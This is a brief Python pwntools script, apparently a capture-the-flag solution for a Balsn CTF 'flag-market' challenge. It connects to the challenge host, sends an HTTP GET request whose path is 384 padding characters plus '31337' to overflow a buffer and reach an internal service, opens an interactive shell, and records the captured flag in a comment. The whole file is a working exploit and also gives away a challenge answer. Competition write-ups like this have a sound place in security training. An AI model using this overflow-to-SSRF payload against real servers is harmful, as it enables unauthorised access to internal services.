#!/usr/bin/env python3
from pwn import *


def main():
    with remote("flag-market-us.balsnctf.com", 35802) as tube:
        path = "A" * 384 + "31337"
        tube.send(
            f"""GET /{path} HTTP/1.1


"""
        )
        tube.interactive()
        # BALSN{5sRf_1n_b!n4ry?!?!6589621de02ead8cae80fa4e6d0f905e}


if __name__ == "__main__":
    main()
